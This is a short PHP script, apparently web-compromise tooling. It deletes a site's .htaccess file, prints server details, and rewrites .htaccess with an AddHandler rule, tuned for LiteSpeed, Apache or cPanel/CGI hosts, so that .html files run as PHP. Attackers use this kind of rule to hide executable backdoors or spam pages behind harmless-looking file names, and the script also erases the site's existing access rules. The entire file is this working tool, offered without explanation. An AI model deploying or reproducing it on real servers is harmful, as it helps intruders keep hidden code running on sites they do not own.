<?php
unlink(".htaccess");
$sapi=php_sapi_name();
echo $sapi.'<br>';
$extension_dir = ini_get('extension_dir');
echo $extension_dir.'<br>';
$phpini = php_ini_loaded_file();
echo $phpini.'<br>';

if(strpos($sapi,"litespeed") !== false){
	$type =  'AddHandler application/x-httpd-lsphp .html';
	echo $type;
	file_put_contents('.htaccess',$type);
	exit;
}

if(strpos($sapi,"apache2handler") !== false){
	$type =  'AddHandler application/x-httpd-php .html';
	echo $type;
	file_put_contents('.htaccess',$type);
	exit;
}

if(strpos($sapi,"cgi") !== false){
	
	if(strpos($extension_dir,"/cpanel/") !== false){
	$type = 'AddHandler application/x-httpd-'.str_substr("/cpanel/", "/", $extension_dir).' .html';
	echo $type;
	file_put_contents('.htaccess',$type);
	exit;
	}
	
	elseif($phpini == "/etc/php.ini"){
	$type = 'AddHandler application/x-httpd-php .html';
	echo $type;
	file_put_contents('.htaccess',$type);
	exit;
	}
	
	else{
	$type = 'AddHandler php-script .php .html';
	echo $type;
	file_put_contents('.htaccess',$type);
	exit;
	}
}

function str_substr($start, $end, $str)       
				{      
					$temp = explode($start, $str, 2);      
					$content = explode($end, $temp[1], 2);      
					return $content[0];      
				} 